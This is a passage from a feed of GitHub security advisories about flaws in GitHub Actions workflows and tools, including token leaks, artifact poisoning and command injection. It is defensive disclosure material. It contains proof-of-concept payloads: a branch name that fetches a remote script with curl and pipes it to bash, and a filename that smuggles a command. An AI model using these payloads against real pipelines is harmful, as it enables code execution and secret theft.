2.20.2.</li>\n<li>The workflow run fails before the CodeQL database is finalized within the <code>github/codeql-action/analyze</code> step.</li>\n<li>Running in any GitHub environment: GitHub.com, GitHub Enterprise Cloud, and GitHub Enterprise Server. (Note: artifacts are only accessible to users within the same GitHub environment with access to the scanned repo.)</li>\n</ul>\n<p>The <code>GITHUB_TOKEN</code> exposed in this way would only have been valid for workflow runs that satisfy all of the following conditions, in addition to the conditions above:</p>\n<ul>\n<li>Using CodeQL Action versions &gt;= 3.26.11 (October 2024) and &lt;= 3.28.2, or &gt;= 2.26.11 and &lt; 3.</li>\n<li>Running in GitHub.com or GitHub Enterprise Cloud only (not valid on GitHub Enterprise Server).</li>\n</ul>\n<p>In rare cases during advanced setup, logging of environment variables may also occur during database creation of Java, Swift, and C/C++. Please read the corresponding CodeQL CLI advisory <a href=\"https://github.com/github/codeql-cli-binaries/security/advisories/GHSA-gqh3-9prg-j95m\">GHSA-gqh3-9prg-j95m</a> for more details.</p>\n<h3 id=\"impact-details\">Impact details</h3>\n<p>In CodeQL CLI versions &gt;= 2.9.2 and &lt;= 2.20.2, the CodeQL Kotlin extractor logs all environment variables by default into an intermediate file during the process of creating a CodeQL database for Kotlin code. \nThis is a part of the CodeQL CLI and is invoked by the CodeQL Action for analyzing Kotlin repositories. \nOn Actions, the environment variables logged include GITHUB_TOKEN, which grants permissions to the repository being scanned.</p>\n<p>The intermediate file containing environment variables is deleted when finalizing the database, so it is not included in a successfully created database. It is, however, included in the debug artifact that is uploaded on a failed analysis run if the CodeQL Action was invoked in debug mode.</p>\n<p>Therefore, under these specific circumstances (incomplete database creation using the CodeQL Action in debug mode) an attacker with access to the debug artifact would gain unauthorized access to repository secrets from the environment, including both the <code>GITHUB_TOKEN</code> and any user-configured secrets made available via environment variables.</p>\n<p>The impact of the <code>GITHUB_TOKEN</code> leaked in this environment is limited:</p>\n<ul>\n<li>For workflows on GitHub.com and GitHub Enterprise Cloud using CodeQL Action versions &gt;= 3.26.11 and &lt;= 3.28.2, or &gt;= 2.26.11 and &lt; 3, which in turn use the <code>actions/artifacts v4</code> library, the debug artifact is uploaded before the workflow job completes. During this time the <code>GITHUB_TOKEN</code> is still valid, providing an opportunity for attackers to gain access to the repository.</li>\n<li>For all other workflows, the debug artifact is uploaded after the workflow job completes, at which point the leaked <code>GITHUB_TOKEN</code> has been revoked and cannot be used to access the repository.</li>\n</ul>\n<h3 id=\"mitigations\">Mitigations</h3>\n<p>Update to CodeQL Action version 3.28.3 or later, or CodeQL CLI version 2.20.3 or later.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This vulnerability has been fixed in CodeQL Action version 3.28.3, which no longer uploads database artifacts in debug mode.\nThis vulnerability will be fixed in CodeQL CLI version 2.20.3, in which database creation for all languages no longer logs the complete environment by default.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/github/codeql-action/pull/1074\">Pull request that bundled CodeQL CLI 2.9.2 with Kotlin extractor environment variable logging </a></li>\n<li><a href=\"https://github.com/github/codeql-action/pull/2482\">Pull request that introduced the <code>actions/artifacts v4</code> library, allowing for <code>GITHUB_TOKEN</code> exposure in the CodeQL Action debug artifacts before the token was revoked</a></li>\n<li><a href=\"https://github.com/github/codeql-cli-binaries/security/advisories/GHSA-gqh3-9prg-j95m\">Related security advisory for the CodeQL CLI</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/github/codeql-action/security/advisories/GHSA-vqf5-2xx6-9wfm\">https://github.com/github/codeql-action/security/advisories/GHSA-vqf5-2xx6-9wfm</a></li>\n<li><a href=\"https://github.com/github/codeql-cli-binaries/security/advisories/GHSA-gqh3-9prg-j95m\">https://github.com/github/codeql-cli-binaries/security/advisories/GHSA-gqh3-9prg-j95m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24362\">https://nvd.nist.gov/vuln/detail/CVE-2025-24362</a></li>\n<li><a href=\"https://github.com/github/codeql-action/pull/1074\">https://github.com/github/codeql-action/pull/1074</a></li>\n<li><a href=\"https://github.com/github/codeql-action/pull/2482\">https://github.com/github/codeql-action/pull/2482</a></li>\n<li><a href=\"https://github.com/github/codeql-action/commit/519de26711ecad48bde264c51e414658a82ef3fa\">https://github.com/github/codeql-action/commit/519de26711ecad48bde264c51e414658a82ef3fa</a></li>\n<li><a href=\"https://docs.github.com/en/code-security/code-scanning/troubleshooting-code-scanning/logs-not-detailed-enough\">https://docs.github.com/en/code-security/code-scanning/troubleshooting-code-scanning/logs-not-detailed-enough</a></li>\n<li><a href=\"https://news.ycombinator.com/item?id=43527044\">https://news.ycombinator.com/item?id=43527044</a></li>\n<li><a href=\"https://www.praetorian.com/blog/codeqleaked-public-secrets-exposure-leads-to-supply-chain-attack-on-github-codeql\">https://www.praetorian.com/blog/codeqleaked-public-secrets-exposure-leads-to-supply-chain-attack-on-github-codeql</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vqf5-2xx6-9wfm\">https://github.com/advisories/GHSA-vqf5-2xx6-9wfm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vqf5-2xx6-9wfm",
            "title": "[github/codeql-action] GitHub PAT written to debug artifacts",
            "date_modified": "2025-03-31T21:55:43.000Z",
            "date_published": "2025-01-24T18:44:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vqf5-2xx6-9wfm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Versions of <code>actions/download-artifact</code> before 4.1.3 are vulnerable to arbitrary file write when downloading and extracting a specifically crafted artifact that contains path traversal filenames.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to version 4.1.3 or higher. Alternatively use 'v4' tag which points to the latest and secure version.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://snyk.io/research/zip-slip-vulnerability\">https://snyk.io/research/zip-slip-vulnerability</a></li>\n<li><a href=\"https://github.com/actions/download-artifact/releases/tag/v4.1.3\">https://github.com/actions/download-artifact/releases/tag/v4.1.3</a></li>\n<li><a href=\"https://github.com/actions/download-artifact/pull/299\">https://github.com/actions/download-artifact/pull/299</a></li>\n</ul>\n<h3 id=\"cve\">CVE</h3>\n<p>CVE-2024-42471</p>\n<h3 id=\"credits\">Credits</h3>\n<p>Justin Taft from Google</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/actions/download-artifact/security/advisories/GHSA-cxww-7g56-2vh6\">https://github.com/actions/download-artifact/security/advisories/GHSA-cxww-7g56-2vh6</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6q32-hq47-5qq3\">https://github.com/advisories/GHSA-6q32-hq47-5qq3</a></li>\n<li><a href=\"https://snyk.io/research/zip-slip-vulnerability\">https://snyk.io/research/zip-slip-vulnerability</a></li>\n<li><a href=\"https://github.com/actions/download-artifact/releases/tag/v4.1.3\">https://github.com/actions/download-artifact/releases/tag/v4.1.3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cxww-7g56-2vh6\">https://github.com/advisories/GHSA-cxww-7g56-2vh6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cxww-7g56-2vh6",
            "title": "[actions/download-artifact] @actions/download-artifact has an Arbitrary File Write via artifact extraction",
            "date_modified": "2025-01-22T17:31:56.000Z",
            "date_published": "2024-09-03T20:55:34.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cxww-7g56-2vh6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>In versions of <code>dawidd6/action-download-artifact</code> before v6, a repository's forks were also searched by default when attempting to find matching artifacts. This could be exploited by an unprivileged attacker to introduce compromised artifacts (such as malicious executables) into a privileged workflow context, as creating a fork requires no privileges.</p>\n<p>Users should immediately upgrade to v6 or newer, which changes the default behavior to avoid searching forks for matching artifacts. Users who cannot upgrade should explicitly set <code>allow_forks: false</code> to disable searching forks for artifacts.</p>\n<h3 id=\"details\">Details</h3>\n<p>GitHub's artifact storage for workflows does not natively distinguish between artifacts created by a repository and artifacts created by forks of that repository. As a result, attempting to retrieve the \"latest\" artifact for a workflow run can return artifacts produced by a fork, rather than its upstream. </p>\n<p>Because any GitHub user can create a fork of a public repository, this allows for artifact poisoning in the following scenarios (as well as potentially others):</p>\n<ol>\n<li>Repository <code>alice/foo</code> runs <code>build.yml</code>, producing <code>build.exe</code></li>\n<li>Repository <code>alice/foo</code> runs <code>publish.yml</code>, which uses <code>action-download-artifact@v5</code> to retrieve the latest <code>build.exe</code> from <code>build.yml</code></li>\n</ol>\n<p>To compromise <code>publish.yml</code> in this scenario, Mallory forks <code>alice/foo</code> to <code>mallory/foo</code>, and then modifies <code>build.yml</code> to produce a compromised <code>build.exe</code>. Mallory can then repeatedly trigger their copy of <code>build.yml</code> to ensure that their compromised <code>build.exe</code> is always the latest artifact, meaning that Alice's <code>publish.yml</code> will retrieve it.</p>\n<p>Additional details on this vulnerability can be found in this blog post from 2022:</p>\n<ul>\n<li><a href=\"https://www.legitsecurity.com/blog/artifact-poisoning-vulnerability-discovered-in-rust\">https://www.legitsecurity.com/blog/artifact-poisoning-vulnerability-discovered-in-rust</a></li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability impacts all repositories on GitHub that use <code>action-download-artifacts@v5</code> or older and do <strong>not</strong> disable <code>allow_forks: true</code>, which is the default.</p>\n<p>If a repository is affected, the severity ranges from downstream contamination (such as publishing attacker-controlled artifacts) to direct workflow compromise (if the retrieved artifact is then executed in a privileged workflow context, such as <code>push</code> or <code>pull_request_target</code>).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/dawidd6/action-download-artifact/security/advisories/GHSA-5xr6-xhww-33m4\">https://github.com/dawidd6/action-download-artifact/security/advisories/GHSA-5xr6-xhww-33m4</a></li>\n<li><a href=\"https://github.com/dawidd6/action-download-artifact/commit/bf251b5aa9c2f7eeb574a96ee720e24f801b7c11\">https://github.com/dawidd6/action-download-artifact/commit/bf251b5aa9c2f7eeb574a96ee720e24f801b7c11</a></li>\n<li><a href=\"https://www.legitsecurity.com/blog/artifact-poisoning-vulnerability-discovered-in-rust\">https://www.legitsecurity.com/blog/artifact-poisoning-vulnerability-discovered-in-rust</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5xr6-xhww-33m4\">https://github.com/advisories/GHSA-5xr6-xhww-33m4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5xr6-xhww-33m4",
            "title": "[dawidd6/action-download-artifact] Artifact poisoning vulnerability in action-download-artifact v5 and earlier",
            "date_modified": "2024-11-25T15:26:44.000Z",
            "date_published": "2024-11-25T15:26:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5xr6-xhww-33m4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Versions of step-security/harden-runner prior to v2.10.2 contain multiple command injection weaknesses via environment variables that could potentially be exploited under specific conditions. However, due to the current execution order of pre-steps in GitHub Actions and the placement of harden-runner as the first step in a job, the likelihood of exploitation is low as the Harden-Runner action reads the environment variable during the pre-step stage. There are no known exploits at this time. </p>\n<h3 id=\"details\">Details</h3>\n<ol>\n<li><p>setup.ts:169 <a href=\"https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/setup.ts#L169\">1</a>  performs <code>execSync</code> with a command that gets\ninvoked after interpretation by the shell. This command includes an\ninterpolated <code>process.env.USER</code> variable, which an attacker could\nmodify (without actually creating a new user) to inject arbitrary\nshell expressions into this <code>execSync</code>. This may or may not be likely\nin practice, but I believe the hygienic way to perform the underlying\noperation is to use <code>execFileSync</code> or similar and bypass the\nunderlying shell evaluation.</p>\n</li>\n<li><p>setup.ts:229 <a href=\"https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/setup.ts#L229\">2</a> has a nearly identical <code>execSync</code> to (1) above,\nbut with <code>$USER</code> for shell-level interpolation rather than string\ninterpolation. However, this is still injectable and would be best\nreplaced by an <code>execFileSync</code>, per above.</p>\n</li>\n<li><p>arc-runner:40-44 <a href=\"https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/arc-runner.ts#L40-L44\">3</a> has an <code>execSync</code> with multiple string\ninterpolations. Most of these do not appear immediately injectible\n(since they appear to come from presumed trusted API responses), but\nthe expansion of <code>getRunnerTempDir()</code> may be injectable due to its\ndependence on potentially attacker-controllable environment variables\n(e.g. <code>RUNNER_TEMP</code>). The underlying operation appears to be a trivial\nfile copy, so this entire subprocess should in theory be replaceable\nwith ordinary NodeJS <code>fs</code> API calls instead.</p>\n</li>\n<li><p>arc-runner:53 <a href=\"https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/arc-runner.ts#L53\">4</a> demonstrates the same weakness, and has the same\nresolution as (3).</p>\n</li>\n<li><p>arc-runner:57 demonstrates the same weakness as (3) and (4), and\nhas the same resolution.</p>\n</li>\n<li><p>arc-runner:61 demonstrates the same weakness as (3), (4), and (5),\nand has the same resolution.</p>\n</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/step-security/harden-runner/security/advisories/GHSA-g85v-wf27-67xc\">https://github.com/step-security/harden-runner/security/advisories/GHSA-g85v-wf27-67xc</a></li>\n<li><a href=\"https://github.com/step-security/harden-runner/commit/0080882f6c36860b6ba35c610c98ce87d4e2f26f\">https://github.com/step-security/harden-runner/commit/0080882f6c36860b6ba35c610c98ce87d4e2f26f</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-52587\">https://nvd.nist.gov/vuln/detail/CVE-2024-52587</a></li>\n<li><a href=\"https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/arc-runner.ts#L40-L44\">https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/arc-runner.ts#L40-L44</a></li>\n<li><a href=\"https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/arc-runner.ts#L53\">https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/arc-runner.ts#L53</a></li>\n<li><a href=\"https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/arc-runner.ts#L57\">https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/arc-runner.ts#L57</a></li>\n<li><a href=\"https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/arc-runner.ts#L61\">https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/arc-runner.ts#L61</a></li>\n<li><a href=\"https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/setup.ts#L169\">https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/setup.ts#L169</a></li>\n<li><a href=\"https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/setup.ts#L229\">https://github.com/step-security/harden-runner/blob/951b48540b429070694bc8abd82fd6901eb123ca/src/setup.ts#L229</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g85v-wf27-67xc\">https://github.com/advisories/GHSA-g85v-wf27-67xc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g85v-wf27-67xc",
            "title": "[step-security/harden-runner] Harden-Runner has a command injection weaknesses in `setup.ts` and `arc-runner.ts`",
            "date_modified": "2024-11-19T20:50:11.000Z",
            "date_published": "2024-11-18T23:48:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g85v-wf27-67xc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The Ultralytics action available at <a href=\"https://github.com/marketplace/actions/ultralytics-actions\">https://github.com/marketplace/actions/ultralytics-actions</a> is vulnerable to GitHub Actions script injection. If anyone uses the action within a workflow that runs on the <code>pull_request_target</code> trigger, then an attacker can inject arbitrary code into that workflow using a crafted branch name.</p>\n<h3 id=\"details\">Details</h3>\n<p>The issue exists because the <code>action.yml</code> is a composite action and uses certain fields by GitHub context expression within a <code>run</code> step:</p>\n<pre><code>        echo \"github.event.pull_request.head.ref: ${{ github.event.pull_request.head.ref }}\"\n        echo \"github.ref: ${{ github.ref }}\"\n        echo \"github.head_ref: ${{ github.head_ref }}\"\n        echo \"github.base_ref: ${{ github.base_ref }}\"\n</code></pre>\n<p>In this case, <code>github.head_ref</code> and <code>github.event.pull_request.head.ref</code> are user controlled and can be used to inject code.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li><p>Create a fork of any repository that uses <code>ultralytics/actions</code> within a workflow that runs on <code>pull_request_target</code>.</p>\n</li>\n<li><p>In the fork create a branch as an injection payload, e.g.: <code>Hacked\";{curl,-sSfL,gist.githubusercontent.com/RampagingSloth/6dc549d083b2da1a54d22cc4feac53a4/raw/4b7499772c53085aeedf459d822aee277b5f17a0/poc.sh}${IFS}|${IFS}bash</code></p>\n</li>\n<li><p>Create a draft pull request.</p>\n</li>\n<li><p>If the action is reachable, then achieve arbitrary code execution.</p>\n</li>\n</ol>\n<p><img alt=\"ultra_cve_poc\" src=\"https://github.com/ultralytics/actions/assets/2006441/b865a54c-38b5-451c-8e93-c497ad6874a2\"></p>\n<p>See my full POC here (<a href=\"https://github.com/AdnaneKhan/Ultralytics_POC/actions/runs/9733997201\">https://github.com/AdnaneKhan/Ultralytics_POC/actions/runs/9733997201</a> and <a href=\"https://github.com/AdnaneKhan/Ultralytics_POC\">https://github.com/AdnaneKhan/Ultralytics_POC</a>), where I created a test workflow that used the action and achieved arbitrary execution using another account by creating a pull request from a fork.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Any workflow that uses the action and runs on <code>pull_request_target</code> is vulnerable to arbitrary code execution within the context of the base branch. An attacker can use this to abuse the <code>GITHUB_TOKEN</code> or steal secrets from the workflow.</p>\n<h3 id=\"fix\">Fix</h3>\n<p>Sanitize the user-controlled variables using environment vars.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ultralytics/actions/security/advisories/GHSA-7x29-qqmq-v6qc\">https://github.com/ultralytics/actions/security/advisories/GHSA-7x29-qqmq-v6qc</a></li>\n<li><a href=\"https://github.com/ultralytics/actions/commit/8069e0ac4c23170f308ea6985783e64ca4a7900a\">https://github.com/ultralytics/actions/commit/8069e0ac4c23170f308ea6985783e64ca4a7900a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7x29-qqmq-v6qc\">https://github.com/advisories/GHSA-7x29-qqmq-v6qc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7x29-qqmq-v6qc",
            "title": "[ultralytics/actions] GitHub Actions Script Injection in `ultralytics/actions`",
            "date_modified": "2024-11-18T16:27:05.000Z",
            "date_published": "2024-08-14T20:53:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7x29-qqmq-v6qc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Improper neutralisation of delimiters in the <code>pattern</code> input (specifically the command separator <code>;</code> and command substitution characters <code>(</code> and <code>)</code>) mean that arbitrary command injection is possible by modification of the input value used in a workflow. This has the potential for exposure or exfiltration of sensitive information from the workflow runner, such as might be achieved by sending environment variables to an external entity.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>As of this writing, the issue has been patched for versions in the <code>v1.x.x</code> release series in release <code>v1.6.12</code> (also tagged as <code>v1.6</code> and <code>v1</code>). The latest available release <code>v2.0.0</code> also includes a corresponding patch (also tagged as <code>v2.0</code> and <code>v2</code>).</p>\n<p>Users should upgrade to at least the patched version <code>v1.6.12</code> or preferably the latest available version <code>v2.0.0</code>. Workflows that use the action ref <code>v1</code> will automatically receive the patched version <code>v1.6.12</code> in future workflow runs.</p>\n<p>Patch summary:</p>\n<table>\n<thead>\n<tr>\n<th>Release series</th>\n<th>Patched tags</th>\n<th>Patched commit hashes</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>1.x.x</code></td>\n<td><code>v1.6.12</code>, <code>v1.6</code>, <code>v1</code></td>\n<td><code>91e6817c48ad475542fe4e78139029b036a53b03</code></td>\n</tr>\n<tr>\n<td><code>2.x.x</code></td>\n<td><code>v2.0.0</code>, <code>v2.0</code>, <code>v2</code></td>\n<td><code>c2cb11395e21119ff8d6e7ea050430ee7d6f49ca</code></td>\n</tr>\n</tbody></table>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Is it recommended that users update to the patched version <code>v1.6.12</code> or the latest release version <code>v2.0.0</code>, however remediation may be possible through careful control of workflows and the <code>pattern</code> input value used by this action.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://cwe.mitre.org/data/definitions/140.html\">CWE-140: Improper Neutralization of Delimiters</a></li>\n<li><a href=\"https://capec.mitre.org/data/definitions/15.html\">CAPEC-15: Command Delimiters</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/fish-shop/syntax-check/security/advisories/GHSA-xj87-mqvh-88w2\">https://github.com/fish-shop/syntax-check/security/advisories/GHSA-xj87-mqvh-88w2</a></li>\n<li><a href=\"https://github.com/fish-shop/syntax-check/commit/91e6817c48ad475542fe4e78139029b036a53b03\">https://github.com/fish-shop/syntax-check/commit/91e6817c48ad475542fe4e78139029b036a53b03</a></li>\n<li><a href=\"https://github.com/fish-shop/syntax-check/commit/c2cb11395e21119ff8d6e7ea050430ee7d6f49ca\">https://github.com/fish-shop/syntax-check/commit/c2cb11395e21119ff8d6e7ea050430ee7d6f49ca</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-42482\">https://nvd.nist.gov/vuln/detail/CVE-2024-42482</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xj87-mqvh-88w2\">https://github.com/advisories/GHSA-xj87-mqvh-88w2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xj87-mqvh-88w2",
            "title": "[fish-shop/syntax-check] fish-shop/syntax-check Improper Neutralization of Delimiters",
            "date_modified": "2024-08-12T19:17:00.000Z",
            "date_published": "2024-08-12T18:25:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xj87-mqvh-88w2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>This GitHub Action use <code>set-env</code> runner commands which are processed via stdout related to GHSA-mfwh-5m23-j46w</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The following versions use the recommended <a href=\"https://github.com/actions/toolkit/blob/main/docs/commands.md#environment-files\">Environment File Syntax</a>.</p>\n<ul>\n<li>2.1.1</li>\n<li>1.1.1</li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None, it is strongly suggested that you upgrade as soon as possible.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in <a href=\"https://github.com/rlespinasse/github-slug-action\">rlespinasse/github-slug-action</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/rlespinasse/github-slug-action/security/advisories/GHSA-7f32-hm4h-w77q\">https://github.com/rlespinasse/github-slug-action/security/advisories/GHSA-7f32-hm4h-w77q</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7f32-hm4h-w77q\">https://github.com/advisories/GHSA-7f32-hm4h-w77q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7f32-hm4h-w77q",
            "title": "[rlespinasse/github-slug-action] github-slug-action use of `set-env` Runner commands which are processed via stdout",
            "date_modified": "2024-02-03T00:22:24.000Z",
            "date_published": "2024-02-03T00:22:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7f32-hm4h-w77q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>This GitHub Action use <code>set-env</code> runner commands which are processed via stdout related to GHSA-mfwh-5m23-j46w</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The following versions use the recommended <a href=\"https://github.com/actions/toolkit/blob/main/docs/commands.md#environment-files\">Environment File Syntax</a>.</p>\n<ul>\n<li>2.1.1</li>\n<li>1.1.1</li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None, it is strongly suggested that you upgrade as soon as possible.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in <a href=\"https://github.com/rlespinasse/github-slug-action\">rlespinasse/github-slug-action</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/rlespinasse/github-slug-action/security/advisories/GHSA-7f32-hm4h-w77q\">https://github.com/rlespinasse/github-slug-action/security/advisories/GHSA-7f32-hm4h-w77q</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7f32-hm4h-w77q\">https://github.com/advisories/GHSA-7f32-hm4h-w77q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7f32-hm4h-w77q",
            "title": "[rlespinasse/github-slug-action] github-slug-action use of `set-env` Runner commands which are processed via stdout",
            "date_modified": "2024-02-03T00:22:24.000Z",
            "date_published": "2024-02-03T00:22:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7f32-hm4h-w77q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>HashiCorp vault-action (aka Vault GitHub Action) before 2.2.0 allows attackers to obtain sensitive information from log files because a multi-line secret was not correctly registered with GitHub Actions for log masking.</p>\n<p>The vault-action implementation did not correctly handle the marking of multi-line variables. As a result, multi-line secrets were not correctly masked in vault-action output.</p>\n<p>Remediation:\nCustomers using vault-action should evaluate the risk associated with this issue, and consider upgrading to vault-action 2.2.0 or newer. Please refer to <a href=\"https://github.com/marketplace/actions/hashicorp-vault\">https://github.com/marketplace/actions/hashicorp-vault</a> for more information.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-32074\">https://nvd.nist.gov/vuln/detail/CVE-2021-32074</a></li>\n<li><a href=\"https://github.com/hashicorp/vault-action/issues/205\">https://github.com/hashicorp/vault-action/issues/205</a></li>\n<li><a href=\"https://github.com/hashicorp/vault-action/pull/208\">https://github.com/hashicorp/vault-action/pull/208</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2021-13-vault-github-action-did-not-correctly-mask-multi-line-secrets-in-output/24128\">https://discuss.hashicorp.com/t/hcsec-2021-13-vault-github-action-did-not-correctly-mask-multi-line-secrets-in-output/24128</a></li>\n<li><a href=\"https://github.com/hashicorp/vault-action/blob/master/CHANGELOG.md\">https://github.com/hashicorp/vault-action/blob/master/CHANGELOG.md</a></li>\n<li><a href=\"https://github.com/hashicorp/vault-action/commit/3526e1be65cf8faf42d6088bc5da8bff596c718a\">https://github.com/hashicorp/vault-action/commit/3526e1be65cf8faf42d6088bc5da8bff596c718a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4mgv-m5cm-f9h7\">https://github.com/advisories/GHSA-4mgv-m5cm-f9h7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4mgv-m5cm-f9h7",
            "title": "[hashicorp/vault-action] Vault GitHub Action did not correctly mask multi-line secrets in output",
            "date_modified": "2024-01-25T19:58:48.000Z",
            "date_published": "2022-05-24T19:01:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4mgv-m5cm-f9h7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <a href=\"https://github.com/tj-actions/verify-changed-files\"><code>tj-actions/verify-changed-files</code></a> action allows for command injection in changed filenames, allowing an attacker to execute arbitrary code and potentially leak secrets.</p>\n<h3 id=\"details\">Details</h3>\n<p>The <a href=\"https://github.com/tj-actions/verify-changed-files\"><code>verify-changed-files</code></a> workflow returns the list of files changed within a workflow execution.</p>\n<p>This could potentially allow filenames that contain special characters such as <code>;</code> and ` (backtick) which can be used by an attacker to take over the <a href=\"https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners\">GitHub Runner</a> if the output value is used in a raw fashion (thus being directly replaced before execution) inside a <code>run</code> block. By running custom commands an attacker may be able to steal **secrets** such as <code>GITHUB_TOKEN</code> if triggered on other events than <code>pull_request</code>. For example on <code>push</code>.</p>\n<h4 id=\"proof-of-concept\">Proof of Concept</h4>\n<ol>\n<li>Submit a pull request to the repository with a new file injecting a command. For example <code>$(whoami).txt</code> would be a valid filename.</li>\n<li>Upon approval of the workflow (triggered by the pull request), the action will get executed and the malicious pull request filename will flow into the <code>List all changed files tracked and untracked files</code> step.</li>\n</ol>\n<pre><code class=\"language-yaml\">- name: List all changed files tracked and untracked files\n  run: |\n    echo \"Changed files: ${{ steps.verify-changed-files.outputs.changed_files }}\"\n</code></pre>\n<p>Example output:</p>\n<pre><code class=\"language-yaml\">##[group]Run echo \"Changed files: $(whoami).txt\"\n  echo \"Changed files: $(whoami).txt\"\u001b[0m\nshell: /usr/bin/bash -e {0}\n##[endgroup]\nChanged files: 